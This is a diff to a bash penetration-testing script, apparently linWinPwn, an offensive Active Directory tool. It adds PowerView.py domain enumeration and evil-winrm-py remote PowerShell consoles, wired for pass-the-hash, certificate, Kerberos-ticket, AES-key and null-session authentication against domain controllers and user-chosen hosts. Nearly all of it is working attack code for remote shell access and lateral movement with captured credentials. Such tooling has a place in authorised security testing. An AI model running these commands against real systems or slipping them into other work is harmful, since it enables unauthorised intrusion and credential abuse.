@@ -154,6 +154,8 @@ adwsdomaindump=$(which adwsdomaindump)
 pyadrecon=$(which pyadrecon)
 pyadrecon_adws=$(which pyadrecon_adws)
 adpulse="$scripts_dir/ADPulse-main/ADPulse.py"
+powerview_py=$(which powerview)
+evil_winrm_py=$(which evil-winrm-py)
 
 print_banner() {
     echo -e "
@@ -163,7 +165,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.4.5 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.4.6 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -743,6 +745,7 @@ authenticate() {
             argument_godap=""
             argument_gpb="-d ${dc_domain}"
             argument_rking="--null-auth"
+            argument_powerview_py="'':''"
             auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}null session ${NC}"
         fi
 
@@ -809,6 +812,8 @@ authenticate() {
         argument_pyadrecon="-u '${user}' -p '${password}' -d ${domain}"
         argument_pyadrecon_adws="-u '${user}' -p '${password}' -d ${domain}"
         argument_adpulse="--user '${user}' --password '${password}' --domain ${domain}"
+        argument_powerview_py="'${domain}/${user}':'${password}'"
+        argument_evil_winrm_py="-u '${user}' -p '${password}'"
         auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}password of ${user}${NC}"
     fi
 
@@ -884,6 +889,8 @@ authenticate() {
             argument_rking="-d ${domain} -u '${user}' --hashes '${hash}'"
             argument_adwsdomaindump="-u '${domain}\\${user}' -p '${hash}'"
             argument_adpulse="--user '${user}' --hash '${hash}' --domain ${domain}"
+            argument_powerview_py=" -H ${hash} '${domain}/${user}'"
+            argument_evil_winrm_py="-u '${user}' -H ${hash:33}                          "
         else
             echo -e "${RED}[i]${NC} Incorrect format of NTLM hash..."
             exit 1
@@ -897,6 +904,8 @@ authenticate() {
             argument_ldeep="-d ${domain} -u '${user}' --pfx-file '${pfxcert}'"
             argument_evilwinrm="-u '${user}' -k '${pem_cert}'"
             argument_ne="-d ${domain} -u '${user}' --pfx-cert '${pfxcert}'"
+            argument_powerview_py="--pfx ${pfxcert} "
+            argument_evil_winrm_py="-u '${user}' --cert-pem '${pfxcert}'"
             auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}Certificate of $user located at $(realpath "$pfxcert")${NC}"
         else
             auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}NTLM hash of '${user}'${NC}"
@@ -943,6 +952,7 @@ authenticate() {
             argument_rking="-d ${domain} -u '${user}' -k -no-pass"
             argument_pyadrecon="-d ${domain} -u '${user}' --auth kerberos --tgt-file '${krb5cc}'"
             argument_pyadrecon_adws="-d ${domain} -u '${user}' --auth kerberos"
+            argument_powerview_py="-k --no-pass '${domain}/${user}'"
             auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}Kerberos Ticket of $user located at $(realpath "$krb5cc")${NC}"
         else
             echo -e "${RED}[i]${NC} Error accessing provided Kerberos ticket $(realpath "$krb5cc")..."
@@ -976,6 +986,7 @@ authenticate() {
         argument_mssqlpwner="${domain}/'${user}' -aesKey ${aeskey} -k"
         argument_daclsearch="-l ${domain} -u '${user}' --aeskey ${aeskey} -k"
         argument_rking="-d ${domain} -u '${user}' --aesKey ${aeskey} -k"
+        argument_powerview_py="--aes-key ${aeskey} '${domain}/${user}'"
         auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}AES Kerberos key of ${user}${NC}"
     fi
 
@@ -2114,6 +2125,19 @@ adpulse_run() {
         run_command "${python3} ${adpulse} ${argument_adpulse} --output-dir ${DomainRecon_dir}/ADPulse --dc-ip ${dc_ip} --report all"
     fi
     
+    echo -e ""
+}
+
+powerview_py_console() {
+    if ! stat "${powerview_py}" >/dev/null 2>&1; then
+        echo -e "${RED}[-] Please verify the installation of powerview_py${NC}"
+        return
+    fi
+    echo -e "${BLUE}[*] Launching powerview_py_console...${NC}"
+    if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param="--use-ldap"; fi
+    if [ "${ldapsign_bool}" == true ]; then ldapsign_param="--use-sign-and-seal"; else ldapsign_param=""; fi
+    if [ "${ldapbind_bool}" == true ]; then ldapbind_param="--use-channel-binding"; else ldapbind_param=""; fi
+    run_command "${powerview_py} ${argument_powerview_py}\\@${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}" | tee -a "${DomainRecon_dir}/powerview_output_${dc_domain}.txt"
     echo -e ""
 }
 
@@ -5013,6 +5037,28 @@ evilwinrm_console() {
     echo -e ""
 }
 
+evilwinrmpy_console() {
+    if ! stat "${evil_winrm_py}" >/dev/null 2>&1; then
+        echo -e "${RED}[-] Please verify the installation of evil_winrm_py${NC}"
+        return
+    fi
+    if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
+        echo -e "${PURPLE}[-] evilwinrmpy_console does not support Null Session, Kerberos or AES Key authentication${NC}"
+    else
+        echo -e "${BLUE}[*] Please specify target IP or hostname:${NC}"
+        echo -e "${CYAN}[*] Example: 10.1.0.5 or SERVER01 or SERVER01.domain.com ${NC}"
+        read -rp ">> " evilwinrm_target </dev/tty
+        while [ "${evilwinrm_target}" == "" ]; do
+            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
+            read -rp ">> " evilwinrm_target </dev/tty
+        done
+        echo -e "${BLUE}[*] Opening evilwinrm console on target: $evilwinrm_target ${NC}"
+        run_command "${evil_winrm_py} ${argument_evil_winrm_py} -i ${evilwinrm_target}" 2>&1 | tee -a "${CommandExec_dir}/impacket_evilwinrmpy_output_${user_var}.txt"
+    fi
+    
+    echo -e ""
+}
+
 # ------------------------------ Auto ------------------------------
 ad_enum() {
     mkdir -p "${DomainRecon_dir}"
@@ -5463,6 +5509,7 @@ ad_menu() {
     check_tool_status "${pyadrecon}" "PyADRecon LDAP Enumeration" "33"
     check_tool_status "${pyadrecon_adws}" "PyADRecon ADWS Enumeration" "34"
     check_tool_status "${adpulse}" "Run ADPulse Checks" "35"
+    check_tool_status "${powerview_py}" "Open PowerView.py Console" "36"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -5656,6 +5703,11 @@ ad_menu() {
 
     35)
         adpulse_run
+        ad_menu
+        ;;
+
+    36)
+        powerview_py_console
         ad_menu
         ;;
 
@@ -7246,6 +7298,7 @@ cmdexec_menu() {
     check_tool_status "${impacket_wmiexec}" "Open CMD console using wmiexec on target" "2"
     check_tool_status "${impacket_psexec}" "Open CMD console using psexec on target" "3"
     check_tool_status "${evilwinrm}" "Open PowerShell console using evil-winrm on target" "4"
+    check_tool_status "${evil_winrm_py}" "Open PowerShell console using evil-winrm-py on target" "5"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -7269,6 +7322,11 @@ cmdexec_menu() {
 
     4)
         evilwinrm_console
+        cmdexec_menu
+        ;;
+
+    5)
+        evilwinrmpy_console
         cmdexec_menu
         ;;
 
@@ -7471,7 +7529,7 @@ auth_menu() {
         if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
             echo -e "${CYAN}[*] Requesting TGT for current user${NC}"
             krb_ticket="${Credentials_dir}/${user}"
-            run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --generate-tgt ${krb_ticket} --log ${Credentials_dir}/getTGT_output_${user_var}.txt"
+            run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --generate-tgt ${krb_ticket} --kdcHost ${dc_FQDN} --log ${Credentials_dir}/getTGT_output_${user_var}.txt"
             if stat "${krb_ticket}.ccache" >/dev/null 2>&1; then
                 echo -e "${GREEN}[+] TGT generated successfully:${NC} '$krb_ticket.ccache'"
                 echo -e "${GREEN}[+] Re-run linWinPwn to use ticket instead:${NC} linWinPwn -t ${dc_ip} -d ${domain} -u '${user}' -K '${krb_ticket}.ccache'"
@@ -7665,6 +7723,8 @@ config_menu() {
         if ! stat "${pyadrecon}" >/dev/null 2>&1; then echo -e "${RED}[-] PyADRecon is not installed${NC}"; else echo -e "${GREEN}[+] PyADRecon is installed${NC}"; fi
         if ! stat "${pyadrecon_adws}" >/dev/null 2>&1; then echo -e "${RED}[-] PyADRecon-ADWS is not installed${NC}"; else echo -e "${GREEN}[+] PyADRecon-ADWS is installed${NC}"; fi
         if ! stat "${adpulse}" >/dev/null 2>&1; then echo -e "${RED}[-] ADPulse is not installed${NC}"; else echo -e "${GREEN}[+] ADPulse is installed${NC}"; fi
+        if ! stat "${powerview_py}" >/dev/null 2>&1; then echo -e "${RED}[-] PowerView.py is not installed${NC}"; else echo -e "${GREEN}[+] PowerView.py is installed${NC}"; fi
+        if ! stat "${evil_winrm_py}" >/dev/null 2>&1; then echo -e "${RED}[-] evil-winrm-py is not installed${NC}"; else echo -e "${GREEN}[+] evil-winrm-py is installed${NC}"; fi
         config_menu
         ;;
 
